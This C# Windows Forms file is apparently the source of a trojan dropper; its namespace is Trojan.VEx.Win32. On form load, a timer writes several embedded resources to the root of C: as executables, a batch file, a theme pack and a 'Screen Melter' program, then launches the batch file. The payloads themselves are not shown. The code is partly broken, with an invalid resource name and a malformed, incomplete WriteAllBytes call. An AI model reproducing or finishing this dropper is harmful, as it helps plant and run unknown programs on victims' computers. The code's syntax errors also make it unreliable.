using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace Trojan.VEx.Win32
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            byte[] myfile4 = Properties.Resources.vexwork2;
            byte[] myfile3 = Properties.Resources.test;
            byte[] myfile2 = Properties.Resources.vexwork4;
            byte[] myfile1 = Properties.Resources.vexwork3;
            byte[] myfile = Properties.Resources.vexwork1;
            byte[] myfile5 = Properties.Resources.Screen Melter;
            File.WriteAllBytes("C:\\vexwork1.exe", myfile);
            File.WriteAllBytes("C:\\vexwork3.deskthemepack", myfile1);
            File.WriteAllBytes("C:\\vexwork4.exe", myfile2);
            File.WriteAllBytes("C:\\test.exe", myfile3);
            File.WriteAllBytes("C:\\vexwork2.bat", myfile4);
            File.WriteAllBytes("C\\Screen Melter.exe")
            Process pross = new Process();
            pross.StartInfo.FileName = "C:\\vexwork2.bat";
            pross.Start();
            timer1.Stop();
        }
    }
}
